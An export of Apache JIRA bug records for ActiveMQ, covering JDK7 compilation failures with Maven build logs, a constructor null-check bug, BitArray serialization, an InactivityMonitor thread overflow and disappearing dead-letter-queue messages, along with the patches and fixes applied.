Activemq-trunk does not compile with JDK7,AMQ-3427,12515816,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,dejanb,areese,areese,29/Jul/11 22:46,05/Oct/11 22:28,14/Jul/23 05:43,01/Sep/11 10:28,5.5.0,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"
This is due to the maven-war-plugin, patch forthcoming.


[INFO] Packaging webapp
[INFO] ------------------------------------------------------------------------
[ERROR] FATAL ERROR
[INFO] ------------------------------------------------------------------------
[INFO] Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor : Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor
---- Debugging information ----
message             : Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor
cause-exception     : com.thoughtworks.xstream.converters.reflection.ObjectAccessException
cause-message       : Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor
class               : org.apache.maven.plugin.war.util.WebappStructure
required-type       : org.apache.maven.plugin.war.util.WebappStructure
path                : /webapp-structure
line number         : 1
-------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] Trace
com.thoughtworks.xstream.converters.ConversionException: Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor : Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor
---- Debugging information ----
message             : Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor
cause-exception     : com.thoughtworks.xstream.converters.reflection.ObjectAccessException
cause-message       : Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor
class               : org.apache.maven.plugin.war.util.WebappStructure
required-type       : org.apache.maven.plugin.war.util.WebappStructure
path                : /webapp-structure
line number         : 1
-------------------------------
        at com.thoughtworks.xstream.core.TreeUnmarshaller.convert(TreeUnmarshall
er.java:89)
        at com.thoughtworks.xstream.core.AbstractReferenceUnmarshaller.convert(A
bstractReferenceUnmarshaller.java:63)
        at com.thoughtworks.xstream.core.TreeUnmarshaller.convertAnother(TreeUnmarshaller.java:76)
        at com.thoughtworks.xstream.core.TreeUnmarshaller.convertAnother(TreeUnmarshaller.java:60)
        at com.thoughtworks.xstream.core.TreeUnmarshaller.start(TreeUnmarshaller.java:137)
        at com.thoughtworks.xstream.core.AbstractTreeMarshallingStrategy.unmarshal(AbstractTreeMarshallingStrategy.java:33)
        at com.thoughtworks.xstream.XStream.unmarshal(XStream.java:923)
        at com.thoughtworks.xstream.XStream.unmarshal(XStream.java:909)
        at com.thoughtworks.xstream.XStream.fromXML(XStream.java:853)
        at org.apache.maven.plugin.war.util.WebappStructureSerializer.fromXml(WebappStructureSerializer.java:73)
        at org.apache.maven.plugin.war.AbstractWarMojo.buildWebapp(AbstractWarMojo.java:423)
        at org.apache.maven.plugin.war.AbstractWarMojo.buildExplodedWebapp(AbstractWarMojo.java:394)
        at org.apache.maven.plugin.war.WarMojo.performPackaging(WarMojo.java:195)
        at org.apache.maven.plugin.war.WarMojo.execute(WarMojo.java:157)
        at org.apache.maven.plugin.DefaultPluginManager.executeMojo(DefaultPluginManager.java:490)
        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeGoals(DefaultLifecycleExecutor.java:694)
        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeGoalWithLifecycle(DefaultLifecycleExecutor.java:556)
        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeGoal(DefaultLifecycleExecutor.java:535)
        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeGoalAndHandleFailures(DefaultLifecycleExecutor.java:387)
        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeTaskSegments(DefaultLifecycleExecutor.java:348)
        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.execute(DefaultLifecycleExecutor.java:180)
        at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:328)
        at org.apache.maven.DefaultMaven.execute(DefaultMaven.java:138)
        at org.apache.maven.cli.MavenCli.main(MavenCli.java:362)
        at org.apache.maven.cli.compat.CompatibleMain.main(CompatibleMain.java:60)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:601)
        at org.codehaus.classworlds.Launcher.launchEnhanced(Launcher.java:315)
        at org.codehaus.classworlds.Launcher.launch(Launcher.java:255)
        at org.codehaus.classworlds.Launcher.mainWithExitCode(Launcher.java:430)
        at org.codehaus.classworlds.Launcher.main(Launcher.java:375)
Caused by: com.thoughtworks.xstream.converters.reflection.ObjectAccessException: Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor
        at com.thoughtworks.xstream.converters.reflection.PureJavaReflectionProvider.newInstance(PureJavaReflectionProvider.java:71)
        at com.thoughtworks.xstream.converters.reflection.AbstractReflectionConverter.instantiateNewInstance(AbstractReflectionConverter.java:308)
        at com.thoughtworks.xstream.converters.reflection.AbstractReflectionConverter.unmarshal(AbstractReflectionConverter.java:161)
        at com.thoughtworks.xstream.core.TreeUnmarshaller.convert(TreeUnmarshaller.java:82)
        ... 32 more","$ java -version
java version ""1.7.0""
Java(TM) SE Runtime Environment (build 1.7.0-b147)
Java HotSpot(TM) 64-Bit Server VM (build 21.0-b17, mixed mode)
Linux hostname.corp.yahoo.com 2.6.18-164.2.1.el5 #1 SMP Mon Sep 21 04:37:42 EDT 2009 x86_64
Red Hat Enterprise Linux Server release 5.4 (Tikanga)
",zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Aug/11 15:44;areese;AMQ-3427-archiver.patch;https://issues.apache.org/jira/secure/attachment/12492467/AMQ-3427-archiver.patch","29/Jul/11 22:52;areese;AMQ-3427.patch;https://issues.apache.org/jira/secure/attachment/12488261/AMQ-3427.patch","02/Aug/11 03:38;areese;AMQ_3427-2.patch;https://issues.apache.org/jira/secure/attachment/12488853/AMQ_3427-2.patch","02/Aug/11 18:54;areese;fix_compiler.patch;https://issues.apache.org/jira/secure/attachment/12489099/fix_compiler.patch",,,,,,,,,,,,,,,,,,4.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14529,,,Wed Oct 05 22:28:55 UTC 2011,,,,,,,,,,,"0|i0aj47:",59370,,,,,,,,,,,,,,,,,,,,,"29/Jul/11 22:52;areese;Patch to fix the maven-war-plugin version to be 2.1.1 which works with JDK.7;;;","01/Aug/11 09:55;dejanb;Patch applied with svn revision 1152720. Thanks!;;;","01/Aug/11 16:31;areese;I thought it was just the site plugin, but it looks like the jdk generics tightening have made things a little rough.  

Error log forth coming, I'll take a hack at another patch as I also see these errors in 5.3.2 building under jdk7.;;;","01/Aug/11 16:36;areese;Path: .
URL: http://svn.apache.org/repos/asf/activemq/trunk
Repository Root: http://svn.apache.org/repos/asf
Repository UUID: 13f79535-47bb-0310-9956-ffa450edef68
Revision: 1152856
Node Kind: directory
Schedule: normal
Last Changed Author: dejanb
Last Changed Rev: 1152757
Last Changed Date: 2011-08-01 06:14:55 -0700 (Mon, 01 Aug 2011)

/home/y/libexec/maven/bin/mvn verify
[INFO] Scanning for projects...
[INFO] Reactor build order: 
[INFO]   ActiveMQ
[INFO]   ActiveMQ :: KahaDB
[INFO]   ActiveMQ :: JAAS
[INFO]   Openwire Generator
[INFO]   ActiveMQ :: jmdns 1.0
[INFO]   ActiveMQ :: Core
[INFO]   ActiveMQ :: RA
[INFO]   ActiveMQ :: Pool
[INFO]   ActiveMQ :: Spring
[INFO]   ActiveMQ :: Camel
[INFO]   ActiveMQ :: Console
[INFO]   ActiveMQ :: Optional
[INFO]   ActiveMQ :: Jar Bundle
[INFO]   ActiveMQ :: File Server
[INFO]   ActiveMQ :: Blueprint
[INFO]   ActiveMQ :: Apache Karaf
[INFO]   ActiveMQ :: RAR
[INFO]   ActiveMQ :: Run Jar
[INFO]   ActiveMQ Tooling
[INFO]   ActiveMQ :: Memory Usage Test Plugin
[INFO]   ActiveMQ :: Performance Test Plugin
[INFO]   ActiveMQ :: StartUp Plugin
[INFO]   ActiveMQ :: Web
[INFO]   ActiveMQ :: Web Demo
[INFO]   ActiveMQ :: XMPP
[INFO]   ActiveMQ :: Web Console
[INFO]   ActiveMQ :: Assembly
[INFO] ------------------------------------------------------------------------
[INFO] Building ActiveMQ
[INFO]    task-segment: [verify]
[INFO] ------------------------------------------------------------------------
[INFO] [enforcer:enforce {execution: default}]
[INFO] [bundle:cleanVersions {execution: cleanVersions}]
[INFO] Setting property: classpath.resource.loader.class => 'org.codehaus.plexus.velocity.ContextClassLoaderResourceLoader'.
[INFO] Setting property: velocimacro.messages.on => 'false'.
[INFO] Setting property: resource.loader => 'classpath'.
[INFO] Setting property: resource.manager.logwhenfound => 'false'.
[INFO] [remote-resources:process {execution: default}]
[INFO] [site:attach-descriptor {execution: default-attach-descriptor}]
[INFO] [ianal:verify-legal-files {execution: default}]
[INFO] ------------------------------------------------------------------------
[INFO] Building ActiveMQ :: KahaDB
[INFO]    task-segment: [verify]
[INFO] ------------------------------------------------------------------------
[INFO] [enforcer:enforce {execution: default}]
[INFO] [bundle:cleanVersions {execution: cleanVersions}]
[INFO] [remote-resources:process {execution: default}]
[INFO] [resources:resources {execution: default-resources}]
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] Copying 2 resources
[INFO] Copying 3 resources
[INFO] [compiler:compile {execution: default-compile}]
[INFO] Nothing to compile - all classes are up to date
[INFO] [resources:testResources {execution: default-testResources}]
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] Copying 1 resource
[INFO] Copying 3 resources
[INFO] [compiler:testCompile {execution: default-testCompile}]
[INFO] Nothing to compile - all classes are up to date
[WARNING] DEPRECATED [systemProperties]: Use systemPropertyVariables instead.
[INFO] [surefire:test {execution: default-test}]
[INFO] Surefire report directory: /home/areese/dev/svn/activemq/activemq-trunk/kahadb/target/surefire-reports

-------------------------------------------------------
 T E S T S
-------------------------------------------------------
Running org.apache.kahadb.index.ListIndexTest
Tests run: 9, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 24.385 sec
Running org.apache.kahadb.index.HashIndexTest
Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 16.877 sec
Running org.apache.kahadb.journal.JournalTest
Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 1.794 sec
Running org.apache.kahadb.page.PageFileTest
Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 2.063 sec
Running org.apache.kahadb.index.BTreeIndexTest
Tests run: 6, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 5.736 sec

Results :

Tests run: 24, Failures: 0, Errors: 0, Skipped: 0

[INFO] [bundle:bundle {execution: default-bundle}]
Should not skip: ^
Should not skip: ^
Should not skip: ^
[INFO] [ianal:verify-legal-files {execution: default}]
[INFO] Checking legal files in: kahadb-5.6-SNAPSHOT.jar
[INFO] ------------------------------------------------------------------------
[INFO] Building ActiveMQ :: JAAS
[INFO]    task-segment: [verify]
[INFO] ------------------------------------------------------------------------
[INFO] [enforcer:enforce {execution: default}]
[INFO] [bundle:cleanVersions {execution: cleanVersions}]
[INFO] [remote-resources:process {execution: default}]
[INFO] [resources:resources {execution: default-resources}]
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /home/areese/dev/svn/activemq/activemq-trunk/activemq-jaas/src/main/resources
[INFO] Copying 3 resources
[INFO] [compiler:compile {execution: default-compile}]
[INFO] Nothing to compile - all classes are up to date
[INFO] [resources:testResources {execution: default-testResources}]
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] Copying 6 resources
[INFO] Copying 3 resources
[INFO] [compiler:testCompile {execution: default-testCompile}]
[INFO] Nothing to compile - all classes are up to date
[WARNING] DEPRECATED [systemProperties]: Use systemPropertyVariables instead.
[INFO] [surefire:test {execution: default-test}]
[INFO] Surefire report directory: /home/areese/dev/svn/activemq/activemq-trunk/activemq-jaas/target/surefire-reports

-------------------------------------------------------
 T E S T S
-------------------------------------------------------
Running org.apache.activemq.jaas.GroupPrincipalTest
Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.483 sec
Running org.apache.activemq.jaas.CertificateLoginModuleTest
Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.487 sec
Running org.apache.activemq.jaas.PropertiesLoginModuleTest
Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.021 sec
Running org.apache.activemq.jaas.UserPrincipalTest
Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.007 sec
Running org.apache.activemq.jaas.GuestLoginModuleTest
Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.006 sec
Running org.apache.activemq.jaas.LDAPLoginModuleTest
Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 8.239 sec

Results :

Tests run: 16, Failures: 0, Errors: 0, Skipped: 0

[INFO] [bundle:bundle {execution: default-bundle}]
[INFO] [ianal:verify-legal-files {execution: default}]
[INFO] Checking legal files in: activemq-jaas-5.6-SNAPSHOT.jar
[INFO] ------------------------------------------------------------------------
[INFO] Building Openwire Generator
[INFO]    task-segment: [verify]
[INFO] ------------------------------------------------------------------------
[INFO] [enforcer:enforce {execution: default}]
[INFO] [bundle:cleanVersions {execution: cleanVersions}]
[INFO] [remote-resources:process {execution: default}]
[INFO] [resources:resources {execution: default-resources}]
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /home/areese/dev/svn/activemq/activemq-trunk/activemq-openwire-generator/src/main/resources
[INFO] Copying 3 resources
[INFO] [compiler:compile {execution: default-compile}]
[INFO] Nothing to compile - all classes are up to date
[INFO] [resources:testResources {execution: default-testResources}]
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /home/areese/dev/svn/activemq/activemq-trunk/activemq-openwire-generator/src/test/resources
[INFO] Copying 3 resources
[INFO] [compiler:testCompile {execution: default-testCompile}]
[INFO] No sources to compile
[INFO] [surefire:test {execution: default-test}]
[INFO] Tests are skipped.
[INFO] [jar:jar {execution: default-jar}]
[INFO] Building jar: /home/areese/dev/svn/activemq/activemq-trunk/activemq-openwire-generator/target/activemq-openwire-generator-5.6-SNAPSHOT.jar
[INFO] [ianal:verify-legal-files {execution: default}]
[INFO] Checking legal files in: activemq-openwire-generator-5.6-SNAPSHOT.jar
[INFO] ------------------------------------------------------------------------
[INFO] Building ActiveMQ :: jmdns 1.0
[INFO]    task-segment: [verify]
[INFO] ------------------------------------------------------------------------
[INFO] [enforcer:enforce {execution: default}]
[INFO] [bundle:cleanVersions {execution: cleanVersions}]
[INFO] [remote-resources:process {execution: default}]
[INFO] [resources:resources {execution: default-resources}]
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] Copying 1 resource
[INFO] Copying 3 resources
[INFO] [compiler:compile {execution: default-compile}]
[INFO] Nothing to compile - all classes are up to date
[INFO] [resources:testResources {execution: default-testResources}]
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /home/areese/dev/svn/activemq/activemq-trunk/activemq-jmdns_1.0/src/test/resources
[INFO] Copying 3 resources
[INFO] [compiler:testCompile {execution: default-testCompile}]
[INFO] No sources to compile
[INFO] [surefire:test {execution: default-test}]
[INFO] Tests are skipped.
[INFO] [jar:jar {execution: default-jar}]
[INFO] Building jar: /home/areese/dev/svn/activemq/activemq-trunk/activemq-jmdns_1.0/target/activemq-jmdns_1.0-5.6-SNAPSHOT.jar
[INFO] [ianal:verify-legal-files {execution: default}]
[INFO] Checking legal files in: activemq-jmdns_1.0-5.6-SNAPSHOT.jar
[INFO] ------------------------------------------------------------------------
[INFO] Building ActiveMQ :: Core
[INFO]    task-segment: [verify]
[INFO] ------------------------------------------------------------------------
[INFO] [enforcer:enforce {execution: default}]
[INFO] [bundle:cleanVersions {execution: cleanVersions}]
[WARNING] While downloading javacc:javacc:3.2
  This artifact has been relocated to net.java.dev.javacc:javacc:3.2.


[INFO] [javacc:javacc {execution: default}]
[INFO] Nothing to process - all grammars are up to date
[INFO] [activemq-protobuf:compile {execution: default}]
[INFO] Compiling: /home/areese/dev/svn/activemq/activemq-trunk/activemq-core/src/main/proto/journal-data.proto
[INFO] [remote-resources:process {execution: default}]
[INFO] [resources:resources {execution: default-resources}]
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] Copying 56 resources
[INFO] Copying 3 resources
[INFO] [compiler:compile {execution: default-compile}]
[INFO] Compiling 1405 source files to /home/areese/dev/svn/activemq/activemq-trunk/activemq-core/target/classes
[INFO] ------------------------------------------------------------------------
[ERROR] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Compilation failure

could not parse error message: warning: [options] bootstrap class path not set in conjunction with -source 1.6
/home/areese/dev/svn/activemq/activemq-trunk/activemq-core/src/main/java/org/apache/activemq/usage/Usage.java:60: error: name has private access in Usage
            name = parent.name + "":"" + name;
                         ^

/home/areese/dev/svn/activemq/activemq-trunk/activemq-core/src/main/java/org/apache/activemq/usage/Usage.java:[297,22] error: addChild(T) has private access in Usage

could not parse error message:   where T is a type-variable:
    T extends Usage declared in class Usage
/home/areese/dev/svn/activemq/activemq-trunk/activemq-core/src/main/java/org/apache/activemq/usage/Usage.java:309: error: removeChild(T) has private access in Usage
                parent.removeChild(this);
                      ^

could not parse error message:   where T is a type-variable:
    T extends Usage declared in class Usage
/home/areese/dev/svn/activemq/activemq-trunk/activemq-core/src/main/java/org/apache/activemq/kaha/MapContainer.java:85: error: name clash: containsKey(K) in MapContainer and containsKey(Object) in Map have the same erasure, yet neither overrides the other
    boolean containsKey(K key);
            ^

could not parse error message:   where K is a type-variable:
    K extends Object declared in interface MapContainer
/home/areese/dev/svn/activemq/activemq-trunk/activemq-core/src/main/java/org/apache/activemq/kaha/MapContainer.java:93: error: name clash: get(K) in MapContainer and get(Object) in Map have the same erasure, yet neither overrides the other
    V get(K key);
      ^

could not parse error message:   where K,V#1,V#2 are type-variables:
    K extends Object declared in interface MapContainer
    V#1 extends Object declared in interface MapContainer
    V#2 extends Object declared in interface Map
/home/areese/dev/svn/activemq/activemq-trunk/activemq-core/src/main/java/org/apache/activemq/kaha/MapContainer.java:99: error: name clash: containsValue(K) in MapContainer and containsValue(Object) in Map have the same erasure, yet neither overrides the other
    boolean containsValue(K o);
            ^

could not parse error message:   where K is a type-variable:
    K extends Object declared in interface MapContainer
/home/areese/dev/svn/activemq/activemq-trunk/activemq-core/src/main/java/org/apache/activemq/kaha/MapContainer.java:106: error: name clash: putAll(Map<K#1,V#1>) in MapContainer and putAll(Map<? extends K#2,? extends V#2>) in Map have the same erasure, yet neither overrides the other
    void putAll(Map<K, V> map);
         ^

could not parse error message:   where K#1,V#1,K#2,V#2 are type-variables:
    K#1 extends Object declared in interface MapContainer
    V#1 extends Object declared in interface MapContainer
    K#2 extends Object declared in interface Map
    V#2 extends Object declared in interface Map
/home/areese/dev/svn/activemq/activemq-trunk/activemq-core/src/main/java/org/apache/activemq/kaha/MapContainer.java:140: error: name clash: remove(K) in MapContainer and remove(Object) in Map have the same erasure, yet neither overrides the other
    V remove(K key);
      ^


[INFO] ------------------------------------------------------------------------
[INFO] For more information, run Maven with the -e switch
[INFO] ------------------------------------------------------------------------
[INFO] Total time: 1 minute 47 seconds
[INFO] Finished at: Mon Aug 01 09:32:06 PDT 2011
[INFO] Final Memory: 61M/438M
[INFO] ------------------------------------------------------------------------
;;;","02/Aug/11 03:38;areese;This patch fixes the access qualifiers in Usage.java, because JDK 7 has more strict checking here.

In MapContainer.java it fixes the conflict with the Map interface that is extended to fix errors about generic type erasure.;;;","02/Aug/11 18:54;areese;3rd patch, pegs the maven-compiler-plugin at 2.3.2 which does a far better job of not croaking on jdk7 compiler messages.;;;","03/Aug/11 10:54;dejanb;Fixed with svn revision 1153425. Thanks for patches!;;;","03/Aug/11 19:50;areese;mvn site works correctly now.

Thanks.;;;","31/Aug/11 15:07;areese;Maven has released new jar/archiver versions that work better with jdk 7
Reopening to attach a patch for that.;;;","31/Aug/11 15:44;areese;Set archiver and jar plugin versions to the newly released versions that work better with jdk.

AMQ-3427-archiver.patch
;;;","01/Sep/11 10:28;dejanb;Patch applied with svn revision 1163987. Thanks!;;;","05/Oct/11 22:28;areese;This is completed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AbstractRegion.java has incorrect null check in contructor,AMQ-3426,12515771,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,tabish,tabish,tabish,29/Jul/11 12:57,20/Sep/11 10:42,14/Jul/23 05:43,29/Jul/11 12:58,5.5.0,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"The constructor for AbstractRegion has a null check that was meant for the destinationFactory but instead check the broker param a second time resulting in some dead code.  

{code}
        if (broker == null) {
            throw new IllegalArgumentException(""null destinationFactory"");
        }
        this.destinationFactory = destinationFactory;
{code}
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14527,,,Fri Jul 29 12:58:30 UTC 2011,,,,,,,,,,,"0|i0aj4f:",59371,,,,,,,,,,,,,,,,,,,,,"29/Jul/11 12:58;tabish;fix applied in trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
BitArray serialization,AMQ-3422,12515663,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,dejanb,dejanb,dejanb,28/Jul/11 14:11,02/May/13 02:29,14/Jul/23 05:43,28/Jul/11 14:12,5.5.0,,,,,5.6.0,,,,,,,0,,,,,,,,,Byte sized data are written as ints,,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3104,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14532,,,Thu Jul 28 14:12:52 UTC 2011,,,,,,,,,,,"0|i0aj4n:",59372,,,,,,,,,,,,,,,,,,,,,"28/Jul/11 14:12;dejanb;Fixed with svn revision 1151857;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
InactiviryMonitor Async Task thread overflow when date changes,AMQ-3414,12515182,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,e3133d3,e3133d3,24/Jul/11 08:36,20/Sep/11 10:41,14/Jul/23 05:43,25/Jul/11 21:31,5.5.0,,,,,5.6.0,,,,,,,0,,,,,,,,,"when I run my application, which starts a broker, and changes the date one month forward I get overflow of InactiviryMonitor Async Task threads.
see attached thread dump, and activemq.xml file","jdk 1.6.0_24, activemq-core 5.5.0",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Jul/11 08:40;e3133d3;activemq.xml;https://issues.apache.org/jira/secure/attachment/12487627/activemq.xml","24/Jul/11 08:40;e3133d3;inactivityMonitorThreadOverflow.txt;https://issues.apache.org/jira/secure/attachment/12487626/inactivityMonitorThreadOverflow.txt",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60109,,,Mon Jul 25 21:31:35 UTC 2011,,,,,,,,,,,"0|i0aj5j:",59376,,,,,,,,,,,,,,,,,,,,,"25/Jul/11 21:31;tabish;Fixed in trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
DLQ messages moved/copied into original queue disappear after failing processing for a second time,AMQ-3405,12514497,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,carfey,carfey,18/Jul/11 19:57,31/Jul/19 18:09,14/Jul/23 05:43,17/Jun/13 22:27,5.4.2,,,,,5.9.0,,,Broker,,,,1,,,,,,,,,"1. Message in queue A fails enough times to be moved to the DLQ.
2. We move/copy the message back to queue A to attempt reprocessing. Invoking the retry operation from JMX can also be used.
3. The consumer once again fails to consume the message greater than the max number of times.
4. The message is not put back into the DLQ. If it was moved rather than copied, it means we have a message that was never successfully consumed, but has nevertheless disappeared.

This is all with the default ActiveMQ settings, though I tried adjusted the DLQ configuration to support both expired and non-persistent messages.

I found this posting which seems to indicate the same issue I am seeing: http://www.mail-archive.com/users@activemq.apache.org/msg09683.html. One difference that I am seeing is that restarting ActiveMQ does not cause the message to show up in the DLQ again. Once it is lost, it is lost forever.

To replicate this, I believe you can use a consumer that just fails on every invocation.

One interesting thing is that if I put a message into the DLQ directly, then move it to a queue with a consumer, it will end up in the DLQ again as you would expect. If I then move the DLQ message back to the original queue, it will then show the bevahiour outlined above.","Windows 7, Java 64bit 1.6 update 20, Client and server 5.4.2",jira-bot,sbrandwoo,slash,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4616,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,64822,,,Wed Jul 31 18:09:50 UTC 2019,,,,,,,,,,,"0|i0suiv:",166422,,,,,,,,,,,,,,,,,,,,,"18/Jul/11 20:05;tabish;It would be really helpful if you could take a stab at creating a JUnit test to reproduce the issue, this will also ensure that if it gets fixed it won't break again.;;;","02/Aug/11 07:49;sbrandwoo;I can confirm that this issue also affects version 5.5.0. It also occurs for any message created by the admin console, they just never go to the DLQ at all.


Does anyone know of a workaround?;;;","16/Aug/11 23:23;tabish;The reason the Message do not reappear in the DLQ is due to Message Audit on the DLQ filtering what would be duplicate messages.  I've created a test case and included it in trunk to show that if Audit is disabled on the DLQ then the Messages are moved back in.  The Move operation places the message onto the destination without modifying its Message Id so any Audited resource will filter it as a duplicate if it was delivered to that destination previously. ;;;","16/Aug/11 23:23;tabish;Working as designed.  See AMQ3405Test.java in trunk for an example.;;;","17/Aug/11 07:58;sbrandwoo;Timothy, I have found that any message I create through the admin console will also not be sent to the DLQ, even if I set it as persistent. Do you know the cause for this?;;;","17/Jun/13 20:46;tabish;While we can work around this with disable of the Audit, it would be better to fix this so that the Audit of the Message is rolled back as messages are moved out of the DLQ.;;;","17/Jun/13 22:27;tabish;Fixed now on trunk, when a message is moved out of a DLQ its rolled back from the DLQ's Audit so subsequent failures will result in it reappearing in the DLQ.  ;;;","07/Jun/18 10:39;jira-bot;Commit 1ebf1862795286505dc2ce2d36e91008029061a3 in activemq's branch refs/heads/master from gtully
[ https://git-wip-us.apache.org/repos/asf?p=activemq.git;h=1ebf186 ]

AMQ-3405 - rework fix to use original destination strategy which may be different from the default shared strategy. new test
;;;","31/Jul/19 18:09;jira-bot;Commit 509c781669fa681eded9d11681e1cb92e5f5d553 in activemq's branch refs/heads/activemq-5.15.x from gtully
[ https://gitbox.apache.org/repos/asf?p=activemq.git;h=509c781 ]

AMQ-3405 - rework fix to use original destination strategy which may be different from the default shared strategy. new test

(cherry picked from commit 1ebf1862795286505dc2ce2d36e91008029061a3)
